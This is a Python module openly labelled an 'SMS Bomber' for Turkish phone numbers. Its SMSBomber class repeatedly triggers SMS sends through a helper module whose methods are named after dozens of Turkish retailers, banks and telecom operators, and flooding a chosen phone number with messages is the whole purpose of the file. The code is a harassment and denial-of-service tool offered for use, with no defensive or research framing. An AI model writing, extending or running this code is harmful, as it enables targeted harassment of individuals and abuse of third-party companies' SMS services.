"""
0312-OSINT SMS Bomber Module - Turkey SMS bombing
"""
import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "tools", "sms"))

try:
    from sms import SendSms
except ImportError:
    SendSms = None


class SMSBomber:
    SERVICES = [
        "KahveDunyasi", "EnUcuza", "KariyerNet", "Sahibinden", "HangiKredi",
        "PttAvm", "Hepsiburada", "Trendyol", "Gittigidiyor", "N11",
        "AmazonTr", "CicekSepeti", "YemekSepeti", "Migros", "CarrefourSA",
        "Getir", "Yemeksepeti", "Mediamarkt", "Teknosa", "VatanBilgisayar",
        "Koton", "Mavi", "LCWaikiki", "AdidasTR", "NikeTR",
        "Biletix", "Passo", "Enuygun", "OBilet", "Turkcell",
        "VodafoneTR", "TurkTelekom", "Akbank", "Garanti", "IsBankasi",
        "YapiKredi", "Ziraat", "DenizBank"
    ]

    def __init__(self, phone):
        self.phone = phone
        self.sender = SendSms(phone, "") if SendSms else None
        self.results = []

    def bomb(self, count=5, delay=1):
        if not self.sender:
            return False, "SMS module not loaded (sms.py missing in tools/sms/)"

        methods = [m for m in dir(self.sender) if m[0].isupper() and callable(getattr(self.sender, m))]
        if not methods:
            methods = self.SERVICES

        sent = 0
        for i in range(count):
            for method_name in methods:
                try:
                    method = getattr(self.sender, method_name, None)
                    if method:
                        result = method()
                        if result:
                            sent += 1
                            self.results.append(f"{method_name}: OK")
                except:
                    pass
            if i < count - 1:
                import time
                time.sleep(delay)

        return True, f"SMS bomb completed: {sent} SMS sent to {self.phone}"

    def list_services(self):
        methods = [m for m in dir(self.sender) if m[0].isupper() and callable(getattr(self.sender, m))] if self.sender else []
        return methods or self.SERVICES


def run_sms_bomb(phone, count=5, delay=1):
    bomber = SMSBomber(phone)
    return bomber.bomb(count, delay)
